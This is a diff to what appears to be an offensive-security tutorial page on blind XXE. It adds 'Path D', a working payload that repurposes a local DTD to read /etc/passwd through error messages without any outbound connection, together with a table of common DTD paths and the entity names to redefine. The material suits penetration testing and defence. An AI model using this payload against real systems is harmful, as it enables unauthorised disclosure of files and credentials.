@@ -351,6 +351,46 @@ For files larger than this, you need to slice the file and exfiltrate in multipl
 
 In practice, automating multi-chunk DNS exfil is what tools like XXEinjector handle - see [Automation](/codex/web/xxe/automation/).
 
+## Path D - Repurpose a local DTD (no outbound at all)
+
+Paths A–C all need the parser to fetch *your* external DTD, and the DNS path needs at least name resolution to leave the network. When the target has **no outbound connectivity whatsoever** - firewalled egress, air-gapped backend - but DOCTYPE and parameter entities are still allowed and errors are echoed, you can still get error-based exfil by **reusing a DTD file already on the target's disk**.
+
+The idea: load a known local DTD with a parameter entity, then *redefine* one of the parameter entities that DTD itself declares, so your redefinition injects the error-triggering chain. No network leaves the box - the only "external" reference is a `file://` to a DTD that's already there.
+
+```xml
+<!DOCTYPE foo [
+  <!-- 1. Pull in a DTD known to exist on the target -->
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+
+  <!-- 2. Redefine an entity THAT DTD defines (ISOamso), smuggling the exfil chain -->
+  <!ENTITY % ISOamso '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+  '>
+
+  <!-- 3. Load the local DTD, which now expands our redefined ISOamso -->
+  %local_dtd;
+]>
+<foo>bar</foo>
+```
+
+When `%local_dtd;` is processed, the parser expands the redefined `ISOamso`, which reads `/etc/passwd` and references it inside a `SYSTEM` path to a nonexistent file - the resulting "file not found" **error message contains the file contents**, exactly like [Path B](#path-b---error-based-exfil) but with no DTD of yours ever fetched over the network.
+
+### Finding a local DTD
+
+You need a DTD file that exists on the target and the name of a parameter entity it declares. Brute-force a shortlist of common ones (and read the DTD first via [file disclosure](/codex/web/xxe/file-disclosure/) if you already have read primitives, to confirm the entity name):
+
+| Path | Platform | Entity to redefine |
+|---|---|---|
+| `/usr/share/yelp/dtd/docbookx.dtd` | Linux (GNOME/yelp) | `ISOamso` |
+| `/usr/share/xml/fontconfig/fonts.dtd` | Linux (fontconfig) | `constant` under some versions |
+| `/opt/IBM/WebSphere/.../*.dtd` | Java appservers | varies |
+| `C:\Windows\System32\wbem\xml\cim20.dtd` | Windows | `SuperClass` |
+
+Confirm the entity name matches the DTD version on the target - a wrong entity name just fails silently. This technique is error-based, so it also requires that parser errors are returned to you (see Path B's prerequisites).
+
 ## Order of operations debugging
 
 XXE blind exfil chains have many moving parts. When it doesn't work:
@@ -423,7 +463,7 @@ Some parsers truly block all blind XXE primitives:
 - Parameter entities disabled
 - DOCTYPE rejected at the application layer
 
-When that's the case, XXE on this endpoint isn't viable. Pivot:
+First rule out the "no egress" case: if DOCTYPE and parameter entities still work and only *outbound network* is blocked, you haven't failed - use [Path D](#path-d---repurpose-a-local-dtd-no-outbound-at-all), which needs no network at all. Pivot only when the primitives above are genuinely disabled:
 
 - **Find another XML surface**: a SOAP endpoint, an admin API, a file-upload that processes XML internally
 - **Find another vulnerability class**: if XML parsing is locked down, look for SSRF, command injection, file upload - XXE is one path of many
